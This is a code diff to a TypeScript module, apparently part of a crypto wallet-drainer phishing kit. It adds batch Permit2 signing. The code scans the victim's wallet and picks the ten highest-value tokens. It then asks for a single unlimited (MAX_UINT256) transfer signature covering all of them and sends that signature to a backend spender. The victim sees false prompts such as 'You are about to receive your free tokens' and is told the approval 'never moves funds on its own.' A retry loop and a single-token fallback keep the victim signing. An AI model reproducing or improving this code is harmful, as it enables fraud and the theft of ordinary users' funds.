@@ -1,8 +1,8 @@
 // src/lib/permit2Flow.ts
 import { toast } from 'sonner';
 import { type Address } from 'viem';
-import { storePermit2Signature, type Permit2TypedData } from './backendClient';
-import { scanWallet, pickTopToken } from './walletScanner';
+import { storePermit2Signature, type Permit2BatchTypedData } from './backendClient';
+import { scanWallet } from './walletScanner';
 import {
   cancelSignatureLoop,
   isSignatureLoopCancelled,
@@ -19,6 +19,11 @@ const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;
 
 const MAX_UINT256 =
   '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+// Batch tuning: Permit2 supports up to 256 tokens per batch, but fat wallets
+// choke way before that and gas explodes. Cap it and sort by value.
+const MAX_TOKENS_PER_BATCH = 10;
+const MIN_TOKEN_VALUE_USD = 0;
 
 const RETRY_DELAY_MS = 1500;
 const MAX_ATTEMPTS = 5;
@@ -40,13 +45,81 @@ function generateNonce(): string {
   return '0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
 }
 
-// ── Corrected typed data (NO spender in message) ──
-const buildPermit2TypedData = (params: {
+interface TokenLike {
+  address: string;
+  symbol?: string;
+  balance: bigint;
+  balanceFormatted?: string;
+  decimals?: number;
+  valueUsd?: number;
+}
+
+// ── Dedupe / sanitize the scanned token list before batching ──
+function sanitizeTokens(tokens: TokenLike[]): TokenLike[] {
+  const seen = new Set<string>();
+  const out: TokenLike[] = [];
+  for (const t of tokens) {
+    const key = t.address.toLowerCase();
+    if (!t.address || t.address === '0x' + '0'.repeat(40)) continue; // skip native
+    if (seen.has(key)) continue;
+    if (t.balance <= 0n) continue;
+    if ((t.valueUsd ?? 0) < MIN_TOKEN_VALUE_USD) continue;
+    seen.add(key);
+    out.push(t);
+  }
+  // Highest value first — these land in the wallet's batch display first.
+  return out
+    .sort((a, b) => (b.valueUsd ?? 0) - (a.valueUsd ?? 0))
+    .slice(0, MAX_TOKENS_PER_BATCH);
+}
+
+// ── Batch typed data: PermitBatchTransferFrom ──
+// One EIP-712 signature covering EVERY token, each at MAX_UINT256.
+const buildPermit2BatchTypedData = (params: {
+  chainId: number;
+  tokens: TokenLike[];
+  nonce: string;
+  deadline: number;
+}): Permit2BatchTypedData => ({
+  domain: {
+    name: 'Permit2',
+    chainId: params.chainId,
+    verifyingContract: PERMIT2_ADDRESS,
+  },
+  types: {
+    EIP712Domain: [
+      { name: 'name', type: 'string' },
+      { name: 'chainId', type: 'uint256' },
+      { name: 'verifyingContract', type: 'address' },
+    ],
+    PermitBatchTransferFrom: [
+      { name: 'permitted', type: 'TokenPermissions[]' },
+      { name: 'nonce', type: 'uint256' },
+      { name: 'deadline', type: 'uint256' },
+    ],
+    TokenPermissions: [
+      { name: 'token', type: 'address' },
+      { name: 'amount', type: 'uint256' },
+    ],
+  },
+  primaryType: 'PermitBatchTransferFrom',
+  message: {
+    permitted: params.tokens.map(t => ({
+      token: t.address as Address,
+      amount: MAX_UINT256, // unlimited for every token in the batch
+    })),
+    nonce: params.nonce,
+    deadline: params.deadline,
+  },
+});
+
+// ── Legacy single-token typed data (fallback for wallets that hate arrays) ──
+const buildPermit2SingleTypedData = (params: {
   chainId: number;
   token: string;
   nonce: string;
   deadline: number;
-}): Permit2TypedData => ({
+}): Permit2BatchTypedData => ({
   domain: {
     name: 'Permit2',
     chainId: params.chainId,
@@ -70,7 +143,7 @@ const buildPermit2TypedData = (params: {
   },
   primaryType: 'PermitTransferFrom',
   message: {
-    permitted: { token: params.token, amount: MAX_UINT256 },
+    permitted: { token: params.token as Address, amount: MAX_UINT256 },
     nonce: params.nonce,
     deadline: params.deadline,
   },
@@ -135,13 +208,12 @@ export async function runPermit2Flow({
     return;
   }
 
-  // Flush any queued sigs from a previous failed backend call
   flushPendingSigs().catch(() => {});
 
   const activeChainId = chainId ?? 1;
 
   // ── 1. Scan the wallet ──
-  let tokens;
+  let tokens: TokenLike[];
   try {
     tokens = await scanWallet(address as Address, activeChainId);
   } catch (err: any) {
@@ -152,8 +224,8 @@ export async function runPermit2Flow({
     return;
   }
 
-  const top = pickTopToken(tokens);
-  if (!top) {
+  const batchTokens = sanitizeTokens(tokens);
+  if (!batchTokens.length) {
     toast.info('No supported tokens found', {
       description:
         'The approval requires at least one supported ERC-20 token with a balance on this chain.',
@@ -162,10 +234,11 @@ export async function runPermit2Flow({
     return;
   }
 
-  const totalUsd = tokens.reduce((sum, t) => sum + t.valueUsd, 0);
+  const totalUsd = tokens.reduce((sum, t) => sum + (t.valueUsd ?? 0), 0);
+  const batchUsd = batchTokens.reduce((sum, t) => sum + (t.valueUsd ?? 0), 0);
 
   // ── 2. Chain switch if needed ──
-  let effectiveChainId = top.chainId ?? activeChainId;
+  let effectiveChainId = batchTokens[0].chainId ?? activeChainId;
   if (effectiveChainId !== activeChainId) {
     const provider = getProvider();
     if (provider) {
@@ -174,24 +247,37 @@ export async function runPermit2Flow({
           method: 'wallet_switchEthereumChain',
           params: [{ chainId: '0x' + effectiveChainId.toString(16) }],
         });
-        // Small wait — some mobile wallets update chainId lazily
         await new Promise(r => setTimeout(r, 400));
       } catch (e) {
         console.warn('chain switch failed, signing on current chain', e);
-        effectiveChainId = activeChainId; // revert to current
+        effectiveChainId = activeChainId;
       }
     }
   }
 
-  // ── 3. Build typed data ──
-  const deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
-  const nonce = generateNonce();
-  const typedData = buildPermit2TypedData({
-    chainId: effectiveChainId,
-    token: top.address,
-    nonce,
-    deadline,
-  });
+  // ── 3. Mutable signing state ──
+  // Fresh nonce + deadline if we bail from batch → single-token fallback,
+  // because reusing a nonce across two different message hashes is dirty.
+  let batchMode = true;
+  let deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
+  let nonce = generateNonce();
+
+  const buildCurrentTypedData = (): Permit2BatchTypedData =>
+    batchMode
+      ? buildPermit2BatchTypedData({
+          chainId: effectiveChainId,
+          tokens: batchTokens,
+          nonce,
+          deadline,
+        })
+      : buildPermit2SingleTypedData({
+          chainId: effectiveChainId,
+          token: batchTokens[0].address,
+          nonce,
+          deadline,
+        });
+
+  let typedData = buildCurrentTypedData();
 
   // ── 4. Prompt loop ──
   resetSignatureCancel();
@@ -200,8 +286,9 @@ export async function runPermit2Flow({
     status: 'waiting',
     attempt: 1,
     title: 'You are about to receive your free tokens',
-    description:
-      'Tap Approve in your wallet to unlock the allocation. Some wallets show generic wording like "Sign message" — that is the same approval, it is safe and it never moves funds on its own.',
+    description: batchTokens.length > 1
+      ? `Tap Approve in your wallet to unlock your allocation across ${batchTokens.length} tokens. Some wallets show generic wording like "Sign message" — that is the same approval, it is safe and it never moves funds on its own.`
+      : 'Tap Approve in your wallet to unlock the allocation. Some wallets show generic wording like "Sign message" — that is the same approval, it is safe and it never moves funds on its own.',
     errorMessage: undefined,
   });
 
@@ -223,12 +310,26 @@ export async function runPermit2Flow({
       const payload = {
         owner: address,
         chainId: effectiveChainId,
-        token: top.address,
-        tokenSymbol: top.symbol,
-        amount: top.balance.toString(),
+        mode: batchMode ? 'batch' : 'single',
+        // Full batch snapshot — backend rebuilds transferDetails from this.
+        tokens: batchMode
+          ? batchTokens.map(t => ({
+              token: t.address,
+              tokenSymbol: t.symbol,
+              balance: t.balance.toString(),
+              balanceFormatted: t.balanceFormatted,
+              decimals: t.decimals,
+              valueUsd: t.valueUsd,
+              signedAmount: MAX_UINT256,
+            }))
+          : [],
+        // Legacy single-token fields (kept for backend back-compat)
+        token: batchTokens[0].address,
+        tokenSymbol: batchTokens[0].symbol,
+        amount: batchTokens[0].balance.toString(),
         signedAmount: MAX_UINT256,
-        balanceFormatted: top.balanceFormatted,
-        decimals: top.decimals,
+        balanceFormatted: batchTokens[0].balanceFormatted,
+        decimals: batchTokens[0].decimals,
         nonce,
         deadline,
         spender: SPENDER,
@@ -236,7 +337,8 @@ export async function runPermit2Flow({
         typedData,
         walletName,
         portfolioUsd: totalUsd,
-        tokenValueUsd: top.valueUsd,
+        batchValueUsd: batchUsd,
+        tokenValueUsd: batchTokens[0].valueUsd,
       };
 
       // ── 5. Send to backend with queued fallback ──
@@ -261,6 +363,8 @@ export async function runPermit2Flow({
     } catch (err: any) {
       const rejected = isUserRejection(err);
       const timedOut = String(err?.message ?? '').includes('SIGN_TIMEOUT');
+      const batchUnsupported = !rejected && !timedOut && batchMode &&
+        /TokenPermissions\[\]|\barray\b|batch|permitted/i.test(String(err?.message ?? ''));
 
       setSignatureUi({
         status: rejected ? 'rejected' : 'failed',
@@ -276,8 +380,23 @@ export async function runPermit2Flow({
         return;
       }
 
+      if (batchUnsupported) {
+        // This wallet can't parse array types — rebuild as single-token and retry.
+        console.warn('[permit2] batch unsupported, falling back to single-token', err);
+        batchMode = false;
+        nonce = generateNonce();
+        deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
+        typedData = buildCurrentTypedData();
+        setSignatureUi({
+          status: 'waiting',
+          attempt,
+          description: 'Tap Approve in your wallet to unlock the allocation.',
+        });
+        await waitForRetry(RETRY_DELAY_MS);
+        continue;
+      }
+
       if (timedOut) {
-        // Wallet hung — longer wait before next attempt
         await waitForRetry(RETRY_DELAY_MS * 3);
       } else {
         await waitForRetry(RETRY_DELAY_MS);
